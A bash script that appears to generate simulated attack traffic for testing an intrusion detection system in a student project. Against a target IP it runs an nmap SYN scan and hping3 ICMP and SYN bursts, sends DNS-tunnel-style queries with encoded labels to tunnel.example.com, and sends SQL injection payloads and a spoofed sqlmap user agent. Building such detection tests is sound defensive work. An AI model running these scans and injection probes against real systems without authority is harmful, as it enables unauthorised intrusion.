#!/usr/bin/env bash
set -euo pipefail

if [[ $# -lt 1 ]]; then
    echo "Usage: sudo $0 <TARGET_IP> [DNS_SERVER]"
    echo "Example: sudo $0 192.168.1.100 8.8.8.8"
    exit 1
fi

TARGET="$1"
DNS_SERVER="${2:-8.8.8.8}"
HTTP_TARGET="http://${TARGET}"

if [[ $EUID -ne 0 ]]; then
    echo "This script needs root: sudo $0 <TARGET_IP> [DNS_SERVER]"
    exit 1
fi

for tool in nmap hping3 dig curl; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool"
        exit 1
    fi
done

run() {
    printf '+'
    printf ' %q' "$@"
    printf '\n'
    "$@" >/dev/null 2>&1 || true
}

pause_short() {
    sleep "0.$((RANDOM % 5 + 3))"
}

background_dns() {
    local domains=(
        "example.com"
        "python.org"
        "debian.org"
        "wikipedia.org"
    )

    for domain in "${domains[@]}"; do
        run dig +short +time=1 +tries=1 "$domain" @"${DNS_SERVER}"
        pause_short
    done
}

background_http() {
    local paths=(
        "/"
        "/favicon.ico"
        "/robots.txt"
    )

    for path in "${paths[@]}"; do
        run curl -s --connect-timeout 2 --max-time 2 "${HTTP_TARGET}${path}" -o /dev/null
        pause_short
    done
}

background_dns
background_http

run nmap -sS \
    -p 21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,1723,3306,3389,5900,8080,8443,8888,9090,9200,9300 \
    --scan-delay 30ms --max-retries 1 -T3 -n --open \
    "$TARGET"

background_http

run hping3 --icmp -i u80000 -c 120 "$TARGET"

background_dns

run hping3 -S -p 80 -i u80000 -c 120 "$TARGET"

background_http

TUNNEL_LABELS=(
    "aGVsbG93b3JsZGhlbGxvd29ybGRoZWxsb3dvcmxkaGVsbG93b3JsZA"
    "dGhpcWlzYXZlcnlsb25nc3ViZG9tYWlubGFiZWxmb3J0ZXN0aW5n"
    "c3VzcGljaW91c2Ruc3F1ZXJ5Zm9ybmlkc2RlbW9wcm9qZWN0dGVzdA"
    "ZGF0YWV4ZmlsdHJhdGlvbnZpYWRuc3R1bm5lbGluZ2RlbW90ZXN0cQ"
    "bmlkc3Byb2plY3RkZW1vYXR0YWNrc2ltdWxhdGlvbnRlc3RsYWJlbA"
    "c2VtZXN0ZXJwcm9qZWN0aW50cnVzaW9uZGV0ZWN0aW9uc3lzdGVtdA"
    "aW50cnVzaW9uZGV0ZWN0aW9uc3lzdGVtZGVtb3Rlc3RsYWJlbHNnbg"
)

for label in "${TUNNEL_LABELS[@]}"; do
    run dig +short +time=1 +tries=1 "${label}.tunnel.example.com" @"${DNS_SERVER}"
    pause_short
done

background_dns

run curl -s --connect-timeout 3 --max-time 3 \
    "${HTTP_TARGET}/index.php?id=%27%20OR%20%271%27%3D%271" \
    -o /dev/null

pause_short

run curl -s --connect-timeout 3 --max-time 3 \
    -A "sqlmap/1.7.8#stable (https://sqlmap.org)" \
    "${HTTP_TARGET}/" \
    -o /dev/null

pause_short

run curl -s --connect-timeout 3 --max-time 3 \
    -X POST "${HTTP_TARGET}/login" \
    --data "username=admin&password=' OR '1'='1" \
    -o /dev/null
